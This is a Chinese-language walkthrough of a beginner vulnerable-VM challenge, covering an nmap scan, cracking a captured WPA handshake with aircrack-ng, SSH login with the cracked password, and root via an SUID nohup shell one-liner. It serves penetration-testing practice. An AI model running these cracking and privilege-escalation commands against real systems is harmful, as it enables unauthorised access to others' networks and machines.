虚拟机简介：枚举是关键，而强行使用SSH将被禁

目标：1个flag

级别：初级

1、使用virtualbox打开直接显示IP地址

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.8

查看开放22、80、8080、8999、9000端口

3、WEB渗透测试

3.1 通过访问网站80端口、8080端口、9000端口，没有有用的信息。

80端口显示信息

8080端口404

9000端口显示页面配置错误

3.2 访问8999端口后应该配置失误，网站显示不正常

3.3 发现有一个WPA-01.CAP文件，使用wireshark打开

打开数据包后查看有一个D-link的设备，SSID为：dlink

3.4 使用aircrack-ng爆破，得到密码为：p4ssword

aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap

3.5 使用SSID: dlink作为用户名和爆破的密码登录

ssh dlink@192.168.1.8

4、系统提权

4.1 检查sudo权限，发现TryHarder，但是该文件不存在

sudo -l

4.2 查找具有suid的二进制文件，可以通过nohup进行提权

find / -perm -u=s -type f 2>/dev/null

4.3 通过nohup进行提权

nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"

4.4 查看flag

cat /root/flag.txt
